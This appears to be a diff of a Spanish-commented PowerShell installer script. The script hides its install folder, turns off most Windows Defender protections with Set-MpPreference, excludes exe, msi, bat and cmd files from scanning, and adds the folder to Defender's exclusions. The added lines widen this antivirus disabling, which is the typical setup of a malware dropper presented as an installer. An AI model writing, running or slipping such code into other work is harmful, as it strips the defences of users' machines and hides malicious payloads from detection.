@@ -12,14 +12,25 @@ New-Item -Path $installPath -ItemType Directory -Force | Out-Null
 Write-Host "Ocultando la carpeta..." -ForegroundColor Cyan
 attrib +h "$installPath"
 
-# Desactivar Windows Defender (requiere administrador)
+# Desactivar protección en tiempo real y otras funciones avanzadas
 Write-Host "Desactivando Windows Defender..." -ForegroundColor Red
+
+# Asegurarse de que Defender está completamente desactivado
 Set-MpPreference -DisableRealtimeMonitoring $true
 Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -DisableIOAVProtection $true
 Set-MpPreference -DisableBlockAtFirstSeen $true
 Set-MpPreference -DisableScanningNetworkFiles $true
-Set-MpPreference -DisableIOAVProtection $true
-Set-MpPreference -DisableScriptScanning $true
+Set-MpPreference -DisableArchiveScanning $true
+Set-MpPreference -DisablePuaScanning $true
+
+# Desactivar la detección de archivos descargados
+Set-MpPreference -DisableAutoExclusions $true
+Set-MpPreference -ExcludeExtension "exe", "msi", "bat", "cmd"
+
+Write-Host "Windows Defender debería estar desactivado." -ForegroundColor Green
+
 
 # Agregar la carpeta a exclusiones de Windows Defender
 Write-Host "Añadiendo $installPath a exclusiones de Windows Defender..." -ForegroundColor Cyan
